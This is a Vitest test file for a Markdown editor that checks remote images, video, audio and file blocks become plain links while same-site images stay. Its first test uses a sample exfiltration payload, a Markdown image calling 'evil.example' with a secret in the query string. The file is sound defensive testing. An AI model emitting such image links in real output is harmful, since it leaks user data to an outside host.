import { describe, expect, test } from 'vitest';
import { createServerEditor, restorePageLinks, stripRemoteMedia, type BlockLike } from '../src/index.js';

const editor = createServerEditor();
const parse = async (markdown: string) =>
  stripRemoteMedia(restorePageLinks((await editor.tryParseMarkdownToBlocks(markdown)) as BlockLike[]));

describe('media from other sites in written Markdown', () => {
  test('an image pointing at another site becomes a plain link that loads nothing', async () => {
    const [block] = await parse('![](https://evil.example/p?d=secret)');
    expect(block!.type).toBe('paragraph');
    expect(JSON.stringify(block)).not.toMatch(/"type":"image"/);
    expect(block!.content).toEqual([
      { type: 'link', href: 'https://evil.example/p?d=secret', content: [{ type: 'text', text: 'https://evil.example/p?d=secret', styles: {} }] },
    ]);
  });

  test('an image on Kinote itself stays an image', async () => {
    const [block] = await parse('![chart](/api/v1/versions/123/file)');
    expect(block!.type).toBe('image');
    expect(block!.props?.url).toBe('/api/v1/versions/123/file');
  });

  test('a protocol-relative URL is another site', async () => {
    const out = stripRemoteMedia([{ id: 'a', type: 'image', props: { url: '//evil.example/x.png' } }]);
    expect(out[0]!.type).toBe('paragraph');
  });

  test('video, audio and file blocks too, and nested children', () => {
    const out = stripRemoteMedia<BlockLike>([
      {
        id: 'p',
        type: 'paragraph',
        content: [],
        children: [
          { id: 'v', type: 'video', props: { url: 'https://cdn.example/v.mp4', name: 'Demo' } },
          { id: 'a', type: 'audio', props: { url: 'https://cdn.example/a.mp3' } },
          { id: 'f', type: 'file', props: { url: 'https://cdn.example/f.pdf', caption: 'Spec' } },
        ],
      },
    ]);
    expect(out[0]!.children!.map((c) => c.type)).toEqual(['paragraph', 'paragraph', 'paragraph']);
    expect(JSON.stringify(out[0]!.children![0]!.content)).toContain('Demo');
    expect(JSON.stringify(out[0]!.children![2]!.content)).toContain('Spec');
  });

  test('text, links and an empty image are left alone', async () => {
    const blocks = await parse('Plain words and [a link](https://example.com).');
    expect(blocks[0]!.type).toBe('paragraph');
    const empty = stripRemoteMedia([{ id: 'e', type: 'image', props: { url: '' } }]);
    expect(empty[0]!.type).toBe('image');
  });
});
